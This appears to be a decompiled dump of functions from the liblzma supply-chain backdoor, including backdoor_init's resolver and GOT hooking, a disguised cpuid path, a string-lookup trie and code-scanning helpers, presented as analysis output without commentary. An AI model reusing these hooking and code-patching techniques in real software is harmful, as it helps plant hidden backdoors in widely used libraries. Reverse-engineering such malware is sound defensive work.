  int *piVar1;
  long lVar2;
  int iVar3;
  long lVar4;
  long lVar5;
  long lVar6;
  ulong uVar7;
  undefined *puVar8;
  undefined4 *puVar9;
  undefined *puVar10;
  undefined *puVar11;
  undefined *puVar12;
  ulong uVar13;
  ulong uVar14;
  byte bVar15;
  undefined local_438 [16];
  undefined4 local_428 [60];
  undefined local_338 [16];
  undefined4 local_328 [60];
  undefined local_238 [16];
  undefined4 local_228;
  undefined local_223 [14];
  undefined local_215;
  undefined local_214 [4];
  undefined local_210;
  undefined local_20f;
  undefined local_20e;
  undefined local_20d;
  undefined local_20c;
  undefined local_20b;
  undefined2 local_20a;
  undefined local_208 [7];
  undefined local_201;
  
  bVar15 = 0;
  piVar1 = *(int **)(global_ctx + 0x30);
  lVar2 = *(long *)(global_ctx + 0x10);
  local_438 = ZEXT816(0);
  puVar9 = local_428;
  for (lVar6 = 0x3c; lVar6 != 0; lVar6 = lVar6 + -1) {
    *puVar9 = 0;
    puVar9 = puVar9 + 1;
  }
  local_338 = ZEXT816(0);
  puVar9 = local_328;
  for (lVar6 = 0x3c; lVar6 != 0; lVar6 = lVar6 + -1) {
    *puVar9 = 0;
    puVar9 = puVar9 + 1;
  }
  local_238 = ZEXT816(0);
  puVar9 = &local_228;
  for (lVar6 = 0x7c; lVar6 != 0; lVar6 = lVar6 + -1) {
    *puVar9 = 0;
    puVar9 = puVar9 + 1;
  }
  if (param_3 != (void *)0x0) {
    if (*piVar1 == 1) {
      return;
    }
    if (*(int *)(global_ctx + 0x90) != 0) {
      return;
    }
    if ((*(long *)(piVar1 + 0x12) != 0) && (*(long *)(piVar1 + 0x14) == 0)) {
      return;
    }
    lVar6 = strlen(param_3);
    endptr = (void *)((long)param_3 + lVar6);
    while( true ) {
      if (endptr <= param_3) {
        return;
      }
      iVar3 = table_get(param_3,endptr);
      if (iVar3 == 0x790) break;
      if ((iVar3 == 0x870) || (iVar3 == 0x1a0)) {
        puVar12 = (undefined *)((long)param_3 + 0x17);
        if (iVar3 == 0x870) {
          puVar12 = (undefined *)((long)param_3 + 0x16);
        }
        uVar13 = 0;
        puVar11 = (undefined *)0x0;
        uVar14 = 0;
        goto LAB_0010a524;
      }
      param_3 = (void *)((long)param_3 + 1);
    }
    local_238._0_2_ = **(undefined2 **)(piVar1 + 4);
    *piVar1 = 1;
    if (((piVar1[2] != 0) && (lVar2 != 0)) && (*(code **)(lVar2 + 0x58) != (code *)0x0)) {
      (**(code **)(lVar2 + 0x58))(0xff);
    }
    FUN_00107420(piVar1,param_1,local_238,param_3);
    iVar3 = piVar1[2];
    goto joined_r0x0010a4e2;
  }
  goto LAB_0010a6fa;
LAB_0010a524:
  do {
    iVar3 = table_get(param_3,endptr);
    if (iVar3 == 0x678) {
      if (puVar11 != (undefined *)0x0) {
        uVar13 = (long)param_3 - (long)puVar11;
        uVar7 = uVar13;
        puVar8 = puVar11;
        puVar10 = local_438;
        if (0xff < uVar13) goto LAB_0010a6fa;
        for (; uVar7 != 0; uVar7 = uVar7 - 1) {
          *puVar10 = *puVar8;
          puVar8 = puVar8 + (ulong)bVar15 * -2 + 1;
          puVar10 = puVar10 + (ulong)bVar15 * -2 + 1;
        }
      }
    }
    else if (iVar3 == 0x810) {
      uVar14 = (long)param_3 - (long)puVar12;
      if (0xff < uVar14) goto LAB_0010a6fa;
      puVar11 = (undefined *)((long)param_3 + 6);
      puVar8 = puVar12;
      puVar10 = local_338;
      for (uVar7 = uVar14; uVar7 != 0; uVar7 = uVar7 - 1) {
        *puVar10 = *puVar8;
        puVar8 = puVar8 + (ulong)bVar15 * -2 + 1;
        puVar10 = puVar10 + (ulong)bVar15 * -2 + 1;
      }
    }
    param_3 = (void *)((long)param_3 + 1);
  } while (param_3 < endptr);
  if ((uVar14 != 0) && (uVar13 != 0)) {
    lVar6 = *(long *)(piVar1 + 6);
    lVar5 = 0;
    do {
      lVar4 = lVar5 + 1;
      local_238[lVar5] = *(undefined *)(lVar6 + lVar5);
      lVar5 = lVar4;
    } while (lVar4 != 0x15);
    lVar6 = *(long *)(piVar1 + 10);
    lVar5 = 0;
    do {
      local_223[lVar5] = *(undefined *)(lVar6 + lVar5);
      lVar5 = lVar5 + 1;
    } while (lVar5 != 0xe);
    local_215 = 0x20;
    lVar6 = *(long *)(piVar1 + 0xc);
    lVar5 = 0;
    do {
      local_214[lVar5] = *(undefined *)(lVar6 + lVar5);
      lVar5 = lVar5 + 1;
    } while (lVar5 != 4);
    local_210 = 0x20;
    local_20f = **(undefined **)(piVar1 + 4);
    local_20e = (*(undefined **)(piVar1 + 4))[1];
    local_20d = 0x20;
    local_20c = **(undefined **)(piVar1 + 4);
    local_20b = (*(undefined **)(piVar1 + 4))[1];
    local_20a = 0x5b20;
    lVar6 = *(long *)(piVar1 + 8);
    lVar5 = 0;
    do {
      local_208[lVar5] = *(undefined *)(lVar6 + lVar5);
      lVar5 = lVar5 + 1;
    } while (lVar5 != 7);
    local_201 = 0x5d;
    *piVar1 = 1;
    if (((piVar1[2] != 0) && (lVar2 != 0)) && (*(code **)(lVar2 + 0x58) != (code *)0x0)) {
      (**(code **)(lVar2 + 0x58))(0xff);
    }
    FUN_00107420(piVar1,3,local_238,local_338,local_438);
    iVar3 = piVar1[2];
joined_r0x0010a4e2:
    if (iVar3 == 0) {
      return;
    }
    if (lVar2 == 0) {
      return;
    }
    if (*(code **)(lVar2 + 0x58) == (code *)0x0) {
      return;
    }
    (**(code **)(lVar2 + 0x58))(0x80000000);
    return;
  }
LAB_0010a6fa:
  *piVar1 = 1;
  return;
}



void _cpuid(int param_1,undefined4 *param_2,undefined4 *param_3,undefined4 *param_4,
           undefined4 *param_5)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  
  if (param_1 == 0) {
    puVar1 = (undefined4 *)cpuid_basic_info(0);
  }
  else if (param_1 == 1) {
    puVar1 = (undefined4 *)cpuid_Version_info(1);
  }
  else if (param_1 == 2) {
    puVar1 = (undefined4 *)cpuid_cache_tlb_info(2);
  }
  else if (param_1 == 3) {
    puVar1 = (undefined4 *)cpuid_serial_info(3);
  }
  else if (param_1 == 4) {
    puVar1 = (undefined4 *)cpuid_Deterministic_Cache_Parameters_info(4);
  }
  else if (param_1 == 5) {
    puVar1 = (undefined4 *)cpuid_MONITOR_MWAIT_Features_info(5);
  }
  else if (param_1 == 6) {
    puVar1 = (undefined4 *)cpuid_Thermal_Power_Management_info(6);
  }
  else if (param_1 == 7) {
    puVar1 = (undefined4 *)cpuid_Extended_Feature_Enumeration_info(7);
  }
  else if (param_1 == 9) {
    puVar1 = (undefined4 *)cpuid_Direct_Cache_Access_info(9);
  }
  else if (param_1 == 10) {
    puVar1 = (undefined4 *)cpuid_Architectural_Performance_Monitoring_info(10);
  }
  else if (param_1 == 0xb) {
    puVar1 = (undefined4 *)cpuid_Extended_Topology_info(0xb);
  }
  else if (param_1 == 0xd) {
    puVar1 = (undefined4 *)cpuid_Processor_Extended_States_info(0xd);
  }
  else if (param_1 == 0xf) {
    puVar1 = (undefined4 *)cpuid_Quality_of_Service_info(0xf);
  }
  else if (param_1 == -0x7ffffffe) {
    puVar1 = (undefined4 *)cpuid_brand_part1_info(0x80000002);
  }
  else if (param_1 == -0x7ffffffd) {
    puVar1 = (undefined4 *)cpuid_brand_part2_info(0x80000003);
  }
  else if (param_1 == -0x7ffffffc) {
    puVar1 = (undefined4 *)cpuid_brand_part3_info(0x80000004);
  }
  else {
    puVar1 = (undefined4 *)cpuid(param_1);
  }
  uVar2 = puVar1[1];
  uVar3 = puVar1[2];
  uVar4 = puVar1[3];
  *param_2 = *puVar1;
  *param_3 = uVar2;
  *param_4 = uVar4;
  *param_5 = uVar3;
  return;
}



undefined4 FUN_0010a740(undefined4 param_1,undefined8 param_2)

{
  undefined8 uVar1;
  undefined4 local_54;
  undefined local_50 [4];
  undefined local_4c [4];
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  
  uVar1 = 0;
  if (DAT_0010cb50 == 1) {
    local_48 = 1;
    local_40 = 0;
    local_38 = 0;
    local_30 = 0;
    local_28 = 0;
    local_20 = param_2;
    backdoor_init(&local_48);
    uVar1 = param_2;
  }
  DAT_0010cb50 = DAT_0010cb50 + 1;
  _cpuid(param_1,&local_54,local_50,local_4c,&local_48,uVar1);
  return local_54;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void backdoor_init(long *param_1)

{
  long lVar1;
  long lVar2;
  long lVar3;
  long *plVar4;
  
  param_1[4] = (long)param_1;
  backdoor_ctx_save();
  lVar2 = _DAT_0010e000;
  param_1[5] = param_1[2];
  lVar3 = *param_1 - param_1[4];
  param_1[1] = lVar3;
  plVar4 = (long *)(lVar3 + *(long *)(lVar2 + 8));
  param_1[2] = (long)plVar4;
  if (plVar4 != (long *)0x0) {
    lVar1 = *plVar4;
    *plVar4 = lVar3 + *(long *)(lVar2 + 0x10);
    (*_DAT_0010e008)();
    *plVar4 = lVar1;
  }
  return;
}



undefined8
_get_cpuid(uint param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,undefined8 param_5,
          undefined8 param_6)

{
  uint uVar1;
  undefined8 uVar2;
  
  uVar1 = FUN_0010a740(param_1 & 0x80000000,param_6);
  if ((uVar1 == 0) || (uVar1 < param_1)) {
    uVar2 = 0;
  }
  else {
    _cpuid(param_1,param_2,param_3,param_4,param_5,0);
    uVar2 = 1;
  }
  return uVar2;
}



// Count number of one bits in value

int count_one_bits(ulong value)

{
  int nbits;
  
  nbits = 0;
  for (; value != 0; value = value & value - 1) {
    nbits = nbits + 1;
  }
  return nbits;
}



int table_get(void *startptr,void *endptr)

{
  ushort *puVar1;
  byte bVar2;
  long lVar3;
  ushort uVar4;
  ushort uVar5;
  int iVar6;
  uint uVar7;
  ushort uVar8;
  uint uVar9;
  ulong *puVar10;
  byte *ptr;
  long lVar11;
  ulong uVar12;
  
  iVar6 = apply_one_entry_ex(0,10,8,1);
  if (iVar6 != 0) {
    ptr = (byte *)((long)startptr + 0x2c);
    if ((endptr != (void *)0x0) && (endptr < ptr)) {
      ptr = (byte *)endptr;
    }
    lVar11 = 0x10c2c8;
    puVar10 = (ulong *)(table2 + 0x760);
    for (; startptr <= ptr; startptr = (void *)((long)startptr + 1)) {
                    // WARNING: Load size is inaccurate
      bVar2 = *startptr;
      uVar9 = (uint)bVar2;
      if ((char)bVar2 < '\0') {
        return 0;
      }
      if (bVar2 < 0x40) {
        uVar12 = *puVar10;
        uVar7 = 0;
        if ((uVar12 >> (bVar2 & 0x3f) & 1) == 0) {
          return 0;
        }
      }
      else {
        uVar12 = puVar10[1];
        uVar9 = uVar9 - 0x40;
        if ((uVar12 >> ((byte)uVar9 & 0x3f) & 1) == 0) {
          return 0;
        }
        uVar7 = count_one_bits(*puVar10);
      }
      while( true ) {
        lVar3 = 0;
        if (uVar12 != 0) {
          for (; (uVar12 >> lVar3 & 1) == 0; lVar3 = lVar3 + 1) {
          }
        }
        if ((uint)lVar3 == (uVar9 & 0xff)) break;
        uVar7 = uVar7 + 1;
        uVar12 = uVar12 & uVar12 - 1;
      }
      puVar1 = (ushort *)(lVar11 + (ulong)uVar7 * 4);
      uVar8 = *puVar1;
      uVar5 = puVar1[1];
      if ((uVar8 & 4) != 0) {
        return (int)(short)uVar5;
      }
      if ((uVar8 & 2) == 0) {
        uVar5 = -uVar5;
      }
      else {
        uVar8 = uVar8 & 0xfffd;
      }
      uVar4 = uVar8 & 0xfffe;
      if ((uVar8 & 1) == 0) {
        uVar4 = -uVar8;
      }
      lVar11 = lVar11 + (short)(uVar5 - 4);
      puVar10 = (ulong *)((long)puVar10 + (long)(short)(uVar4 - 0x10));
    }
  }
  return 0;
}



undefined8 _Llzma_lzma_encoder_init_0(long param_1,uint *param_2)

{
  byte *pbVar1;
  uint uVar2;
  int iVar3;
  
  uVar2 = *param_2;
  if (uVar2 < 0x1c8) {
    iVar3 = *(int *)(param_1 + 0x28);
    if (((iVar3 != 0x109) && (iVar3 != 0xbb)) &&
       ((0x2e < iVar3 - 0x83U || ((0x410100000101U >> ((byte)(iVar3 - 0x83U) & 0x3f) & 1) == 0)))) {
      pbVar1 = (byte *)(global_ctx + 0x108 + (ulong)(uVar2 >> 3));
      *pbVar1 = *pbVar1 | (byte)(1 << ((byte)uVar2 & 7));
    }
    *param_2 = uVar2 + 1;
  }
  return 1;
}



bool apply_method_2(long param_1,undefined8 param_2,undefined4 param_3,uint param_4,int param_5)

{
  int iVar1;
  long lVar2;
  long *plVar3;
  ulong uVar4;
  undefined4 local_9c [3];
  long local_90;
  long local_88;
  
  plVar3 = &local_90;
  for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
    *(undefined4 *)plVar3 = 0;
    plVar3 = (long *)((long)plVar3 + 4);
  }
  local_9c[0] = param_3;
  if (param_5 != 0) {
    iVar1 = _Llzma_optimum_normal_0(param_1,param_2,0,&local_90);
    if (iVar1 == 0) {
      return false;
    }
    param_1 = local_88 + local_90;
  }
  uVar4 = 0;
  do {
    iVar1 = _Llzma_block_total_size_0(param_1,param_2,&local_90);
    if (iVar1 == 0) {
LAB_0010aaa0:
      return param_4 == (uint)uVar4;
    }
    if (uVar4 == param_4) {
      if (param_4 < (uint)uVar4) {
        return false;
      }
      goto LAB_0010aaa0;
    }
    uVar4 = uVar4 + 1;
    iVar1 = _Llzma_lzma_encoder_init_0(&local_90,local_9c);
    if (iVar1 == 0) {
      return false;
    }
    param_1 = local_88 + local_90;
  } while( true );
}



undefined8
apply_one_entry_internal
          (long param_1,undefined8 param_2,undefined4 param_3,int param_4,uint param_5)

{
  long lVar1;
  int iVar2;
  undefined8 uVar3;
  undefined8 local_30 [2];
  
  lVar1 = global_ctx;
  local_30[0] = 0;
  if ((global_ctx == 0) || (*(char *)(global_ctx + 0x141 + (ulong)param_5) != '\0')) {
LAB_0010ab80:
    uVar3 = 1;
  }
  else {
    *(undefined *)(global_ctx + 0x141 + (ulong)param_5) = 1;
    iVar2 = apply_method_1(param_2,local_30,0,*(undefined8 *)(lVar1 + 0x80),
                           *(undefined8 *)(lVar1 + 0x88),1);
    if (iVar2 != 0) {
      iVar2 = apply_method_2(local_30[0],*(undefined8 *)(global_ctx + 0x88),param_3,param_4,
                             param_1 == 0);
      if (iVar2 != 0) {
        *(int *)(global_ctx + 0x160) = *(int *)(global_ctx + 0x160) + param_4;
        goto LAB_0010ab80;
      }
    }
    uVar3 = 0;
  }
  return uVar3;
}



undefined8
apply_one_entry(undefined4 param_1,undefined4 param_2,undefined4 param_3,int param_4,
               undefined8 param_5)

{
  undefined8 uVar1;
  
  if (param_4 != 0) {
    uVar1 = apply_one_entry_internal(param_5,param_5,param_1,param_3,param_2);
    return uVar1;
  }
  return 0;
}



undefined  [16]
apply_one_entry_ex(ulong param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                  undefined8 param_5)

{
  int iVar1;
  ulong uVar2;
  undefined auVar3 [16];
  ulong unaff_retaddr;
  
  uVar2 = param_1;
  if (param_1 < 2) {
    uVar2 = unaff_retaddr;
  }
  iVar1 = apply_one_entry_internal(param_1,uVar2,param_2,param_3,param_4);
  auVar3._1_7_ = 0;
  auVar3[0] = 0 < iVar1;
  auVar3._8_8_ = param_5;
  return auVar3;
}



uint _Llzma_index_iter_rewind_cold
               (undefined4 param_1,undefined4 param_2,undefined4 param_3,uint param_4)

{
  uint uVar1;
  undefined8 unaff_retaddr;
  
  uVar1 = apply_one_entry_internal(0,unaff_retaddr,param_1,param_2,param_3);
  return uVar1 | param_4;
}



undefined8 apply_entries(long param_1,ulong param_2,code *param_3)

{
  long lVar1;
  undefined8 *puVar2;
  undefined8 uVar3;
  int iVar4;
  ulong uVar5;
  
  uVar5 = 0;
  iVar4 = 0;
  while( true ) {
    while( true ) {
      if (param_2 <= uVar5) {
        return 1;
      }
      lVar1 = uVar5 * 0x18;
      uVar5 = (ulong)((int)uVar5 + 1);
      puVar2 = (undefined8 *)(lVar1 + param_1);
      if (*(int *)((long)puVar2 + 0x14) != 0) break;
      *(int *)((long)puVar2 + 0x14) = iVar4;
    }
    uVar3 = (*param_3)(*(undefined4 *)(puVar2 + 1),*(undefined4 *)((long)puVar2 + 0xc),
                       *(undefined4 *)(puVar2 + 2),uVar5,*puVar2);
    if ((int)uVar3 == 0) break;
    iVar4 = iVar4 + 1;
  }
  return uVar3;
}



undefined8 _Llzma_block_total_size_0(ulong param_1,ulong param_2,long *param_3)

{
  int iVar1;
  uint uVar2;
  
  if (param_3 == (long *)0x0) {
    return 0;
  }
  while( true ) {
    if ((param_2 <= param_1) || (iVar1 = code_dasm(param_3,param_1,param_2), iVar1 == 0)) {
      return 0;
    }
    if (((((*(uint *)(param_3 + 5) & 0xfffffffd) == 0x109) ||
         ((uVar2 = *(uint *)(param_3 + 5) - 0x81, uVar2 < 0x3b &&
          ((0x505050500000505U >> ((byte)uVar2 & 0x3f) & 1) != 0)))) &&
        ((*(ushort *)(param_3 + 2) & 0xf80) == 0)) &&
       (((*(byte *)((long)param_3 + 0x1b) & 5) == 0 && (*(char *)((long)param_3 + 0x1d) == '\x03')))
       ) break;
    param_1 = param_3[1] + *param_3;
  }
  return 1;
}


